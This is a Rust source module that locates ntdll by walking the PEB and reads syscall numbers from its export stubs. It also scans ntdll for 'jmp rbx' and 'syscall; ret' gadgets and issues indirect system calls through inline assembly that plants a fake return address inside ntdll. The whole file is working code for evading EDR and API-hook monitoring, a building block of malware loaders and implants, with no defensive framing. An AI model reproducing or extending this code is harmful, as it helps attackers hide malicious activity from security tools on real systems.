#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(non_upper_case_globals)]

use std::arch::asm;
pub use windows_sys::Win32::Foundation::{UNICODE_STRING, NTSTATUS};
pub use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY, IMAGE_DOS_SIGNATURE};

#[repr(C)]
#[derive(Copy, Clone)]
pub struct LIST_ENTRY {
    pub Flink: *mut LIST_ENTRY,
    pub Blink: *mut LIST_ENTRY,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct PEB_LDR_DATA {
    pub Length: u32,
    pub Initialized: u8,
    pub SsHandle: *mut core::ffi::c_void,
    pub InLoadOrderModuleList: LIST_ENTRY,
    pub InMemoryOrderModuleList: LIST_ENTRY,
    pub InInitializationOrderModuleList: LIST_ENTRY,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct LDR_DATA_TABLE_ENTRY {
    pub InLoadOrderLinks: LIST_ENTRY,
    pub InMemoryOrderLinks: LIST_ENTRY,
    pub u1: LIST_ENTRY,
    pub DllBase: *mut core::ffi::c_void,
    pub EntryPoint: *mut core::ffi::c_void,
    pub SizeOfImage: u32,
    pub FullDllName: UNICODE_STRING,
    pub BaseDllName: UNICODE_STRING,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct IMAGE_DATA_DIRECTORY {
    pub VirtualAddress: u32,
    pub Size: u32,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct IMAGE_FILE_HEADER {
    pub Machine: u16,
    pub NumberOfSections: u16,
    pub TimeDateStamp: u32,
    pub PointerToSymbolTable: u32,
    pub NumberOfSymbols: u32,
    pub SizeOfOptionalHeader: u16,
    pub Characteristics: u16,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct IMAGE_OPTIONAL_HEADER64 {
    pub Magic: u16,
    pub MajorLinkerVersion: u8,
    pub MinorLinkerVersion: u8,
    pub SizeOfCode: u32,
    pub SizeOfInitializedData: u32,
    pub SizeOfUninitializedData: u32,
    pub AddressOfEntryPoint: u32,
    pub BaseOfCode: u32,
    pub ImageBase: u64,
    pub SectionAlignment: u32,
    pub FileAlignment: u32,
    pub MajorOperatingSystemVersion: u16,
    pub MinorOperatingSystemVersion: u16,
    pub MajorImageVersion: u16,
    pub MinorImageVersion: u16,
    pub MajorSubsystemVersion: u16,
    pub MinorSubsystemVersion: u16,
    pub Win32VersionValue: u32,
    pub SizeOfImage: u32,
    pub SizeOfHeaders: u32,
    pub CheckSum: u32,
    pub Subsystem: u16,
    pub DllCharacteristics: u16,
    pub SizeOfStackReserve: u64,
    pub SizeOfStackCommit: u64,
    pub SizeOfHeapReserve: u64,
    pub SizeOfHeapCommit: u64,
    pub LoaderFlags: u32,
    pub NumberOfRvaAndSizes: u32,
    pub DataDirectory: [IMAGE_DATA_DIRECTORY; 16],
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct IMAGE_NT_HEADERS64 {
    pub Signature: u32,
    pub FileHeader: IMAGE_FILE_HEADER,
    pub OptionalHeader: IMAGE_OPTIONAL_HEADER64,
}

pub unsafe fn get_ntdll_base() -> *mut core::ffi::c_void {
    let peb: *mut u8;
    asm!("mov {}, gs:[0x60]", out(reg) peb);

    let ldr = *(peb.add(0x18) as *const *mut PEB_LDR_DATA);
    let mut current_entry = (*ldr).InLoadOrderModuleList.Flink;

    while current_entry != &mut (*ldr).InLoadOrderModuleList {
        let table_entry = current_entry as *mut LDR_DATA_TABLE_ENTRY;

        let name_slice = std::slice::from_raw_parts(
            (*table_entry).BaseDllName.Buffer,
            ((*table_entry).BaseDllName.Length / 2) as usize
        );

        let target = ['n' as u16, 't' as u16, 'd' as u16, 'l' as u16, 'l' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16];
        let mut match_found = true;
        if name_slice.len() == target.len() {
            for i in 0..target.len() {
                let mut c = name_slice[i];
                if c >= 'A' as u16 && c <= 'Z' as u16 {
                    c += 32;
                }
                if c != target[i] {
                    match_found = false;
                    break;
                }
            }
            if match_found {
                return (*table_entry).DllBase;
            }
        }

        current_entry = (*current_entry).Flink;
    }

    core::ptr::null_mut()
}

pub unsafe fn get_ssn(ntdll_base: *const u8, function_name: &str) -> Option<u32> {
    let dos_header = ntdll_base as *const IMAGE_DOS_HEADER;
    if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
        return None;
    }

    let nt_headers = ntdll_base.add((*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
    let export_dir_entry = (*nt_headers).OptionalHeader.DataDirectory[0];
    let export_dir = ntdll_base.add(export_dir_entry.VirtualAddress as usize) as *const IMAGE_EXPORT_DIRECTORY;

    let names = std::slice::from_raw_parts(
        ntdll_base.add((*export_dir).AddressOfNames as usize) as *const u32,
        (*export_dir).NumberOfNames as usize
    );
    let functions = std::slice::from_raw_parts(
        ntdll_base.add((*export_dir).AddressOfFunctions as usize) as *const u32,
        (*export_dir).NumberOfFunctions as usize
    );
    let ordinals = std::slice::from_raw_parts(
        ntdll_base.add((*export_dir).AddressOfNameOrdinals as usize) as *const u16,
        (*export_dir).NumberOfNames as usize
    );

    for i in 0..(*export_dir).NumberOfNames as usize {
        let name_ptr = ntdll_base.add(names[i] as usize) as *const i8;
        let name = std::ffi::CStr::from_ptr(name_ptr).to_str().unwrap_or("");

        if name == function_name {
            let ordinal = ordinals[i];
            let function_addr = ntdll_base.add(functions[ordinal as usize] as usize);

            if *function_addr == 0x4c && *function_addr.add(1) == 0x8b && *function_addr.add(2) == 0xd1 && *function_addr.add(3) == 0xb8 {
                return Some(*(function_addr.add(4) as *const u32));
            }
            if *function_addr == 0xb8 {
                return Some(*(function_addr.add(1) as *const u32));
            }
        }
    }

    None
}

pub unsafe fn find_jmp_rbx_gadget(ntdll_base: *const u8) -> Option<*const u8> {
    let dos_header = ntdll_base as *const IMAGE_DOS_HEADER;
    let nt_headers = ntdll_base.add((*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
    let size_of_image = (*nt_headers).OptionalHeader.SizeOfImage as usize;

    for i in 0..size_of_image - 2 {
        let ptr = ntdll_base.add(i);
        if *ptr == 0xFF && *ptr.add(1) == 0xE3 {
            return Some(ptr);
        }
    }
    None
}

pub unsafe fn find_syscall_gadget(ntdll_base: *const u8) -> Option<*const u8> {
    let dos_header = ntdll_base as *const IMAGE_DOS_HEADER;
    let nt_headers = ntdll_base.add((*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
    let size_of_image = (*nt_headers).OptionalHeader.SizeOfImage as usize;

    for i in 0..size_of_image - 3 {
        let ptr = ntdll_base.add(i);
        if *ptr == 0x0F && *ptr.add(1) == 0x05 && *ptr.add(2) == 0xC3 {
            return Some(ptr);
        }
    }
    None
}

pub unsafe fn spoof_syscall(
    ssn: u32,
    syscall_gadget: *const u8,
    jmp_rbx_gadget: *const u8,
    args: &[usize],
) -> NTSTATUS {
    let mut result: NTSTATUS;
    let num_args = args.len();

    let mut stack_args = [0usize; 12];
    for i in 0..num_args {
        stack_args[i] = args[i];
    }

    asm!(
        "push rsi",
        "push rdi",
        "push rbx",
        "push rbp",
        "mov rbp, rsp",

        "cmp {num_args}, 4",
        "jbe 3f",

        "mov rcx, {num_args}",
        "sub rcx, 4",
        "2:",
        "mov rax, [{stack_args_ptr} + rcx*8 + 24]",
        "push rax",
        "sub rcx, 1",
        "jnz 2b",

        "3:",
        "sub rsp, 0x20",      // Shadow space
        "lea rbx, [rip + 4f]", // Real return address
        "push {jmp_rbx}",     // Fake return address (points to jmp rbx in ntdll)

        "mov r10, {arg1}",
        "mov rdx, {arg2}",
        "mov r8, {arg3}",
        "mov r9, {arg4}",
        "mov rax, {ssn}",
        "jmp {syscall_gadget}",

        "4:",
        "mov rsp, rbp",
        "pop rbp",
        "pop rbx",
        "pop rdi",
        "pop rsi",

        num_args = in(reg) num_args,
        stack_args_ptr = in(reg) stack_args.as_ptr(),
        jmp_rbx = in(reg) jmp_rbx_gadget,
        ssn = in(reg) ssn as usize,
        syscall_gadget = in(reg) syscall_gadget,
        arg1 = in(reg) stack_args[0],
        arg2 = in(reg) stack_args[1],
        arg3 = in(reg) stack_args[2],
        arg4 = in(reg) stack_args[3],
        lateout("rax") result,
    );

    result
}

#[macro_export]
macro_rules! syscall {
    ($ssn:expr, $gadget:expr, $jmp_rbx:expr, $($arg:expr),*) => {
        {
            let args = [$( $arg as usize ),*];
            $crate::syscalls::spoof_syscall($ssn, $gadget, $jmp_rbx, &args)
        }
    };
}
